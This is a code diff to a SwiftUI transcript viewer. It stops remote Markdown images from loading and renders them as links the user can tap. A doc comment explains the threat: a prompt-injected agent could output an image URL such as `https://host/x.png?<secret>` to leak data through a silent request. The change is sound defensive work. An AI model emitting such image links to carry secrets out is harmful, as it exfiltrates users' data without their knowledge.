@@ -93,6 +93,19 @@ struct TranscriptMarkdownImageSource: Sendable {
         target.hasPrefix("argmax-attachment://") || target.contains("/attachments/")
     }
 
+    /// A remote image is never fetched. Loading one is a silent outbound
+    /// request the reader did not ask for, so a prompt-injected agent could
+    /// name `![](https://host/x.png?<secret>)` and have the phone carry the
+    /// secret out. It renders as a link the reader can choose to follow,
+    /// matching the web renderer's `resolveChatImageSrc`.
+    var remoteURL: URL? {
+        guard let url = URL(string: target),
+              let scheme = url.scheme?.lowercased(),
+              scheme == "http" || scheme == "https"
+        else { return nil }
+        return url
+    }
+
     init(alt: String, target: String) {
         self.alt = alt
         self.target = target
@@ -123,7 +136,9 @@ struct TranscriptMarkdownImage: View {
     let onOpenFile: (String) -> Void
 
     var body: some View {
-        if let client {
+        if image.remoteURL != nil {
+            TranscriptFileFallback(source: image, onOpenFile: onOpenFile)
+        } else if let client {
             TranscriptImageTile(
                 source: image,
                 client: client,
@@ -131,9 +146,6 @@ struct TranscriptMarkdownImage: View {
                 compact: false,
                 onOpenFile: onOpenFile
             )
-                .frame(maxWidth: .infinity, minHeight: 120, maxHeight: 360)
-        } else if let scheme = URL(string: image.target)?.scheme, scheme == "http" || scheme == "https" {
-            TranscriptImageTile(source: image, client: nil, attachment: false, compact: false, onOpenFile: onOpenFile)
                 .frame(maxWidth: .infinity, minHeight: 120, maxHeight: 360)
         } else {
             TranscriptFileFallback(source: image, onOpenFile: onOpenFile)
@@ -182,9 +194,6 @@ private struct TranscriptImageTile: View {
     }
 
     private func load() async {
-        if let url = URL(string: source.target), url.scheme == "http" || url.scheme == "https" {
-            await load(URLRequest(url: url)); return
-        }
         let sourceURL = URL(string: source.target) ?? URL(fileURLWithPath: source.target)
         let path = TranscriptMarkdownDocument.isLocalLink(sourceURL)
             ? TranscriptMarkdownDocument.localPath(from: sourceURL)
@@ -217,18 +226,28 @@ private struct TranscriptFileFallback: View {
     let onOpenFile: (String) -> Void
 
     var body: some View {
-        Button { onOpenFile(source.target) } label: {
-            Label {
-                Text(source.alt.isEmpty ? URL(fileURLWithPath: source.target).lastPathComponent : source.alt)
-                    .typeStyle(.footnote)
-            } icon: {
-                Image(systemName: "photo").typeSymbol(.footnote)
+        if let remote = source.remoteURL {
+            Link(destination: remote) { chip(label: source.alt.isEmpty ? remote.host ?? source.target : source.alt) }
+                .buttonStyle(.plain)
+        } else {
+            Button { onOpenFile(source.target) } label: {
+                chip(label: source.alt.isEmpty
+                    ? URL(fileURLWithPath: source.target).lastPathComponent
+                    : source.alt)
             }
-                .foregroundStyle(Theme.ink)
-                .padding(10)
-                .background(Theme.raised, in: RoundedRectangle(cornerRadius: 10, style: .continuous))
+            .buttonStyle(.plain)
         }
-        .buttonStyle(.plain)
+    }
+
+    private func chip(label: String) -> some View {
+        Label {
+            Text(label).typeStyle(.footnote)
+        } icon: {
+            Image(systemName: "photo").typeSymbol(.footnote)
+        }
+            .foregroundStyle(Theme.ink)
+            .padding(10)
+            .background(Theme.raised, in: RoundedRectangle(cornerRadius: 10, style: .continuous))
     }
 }
 
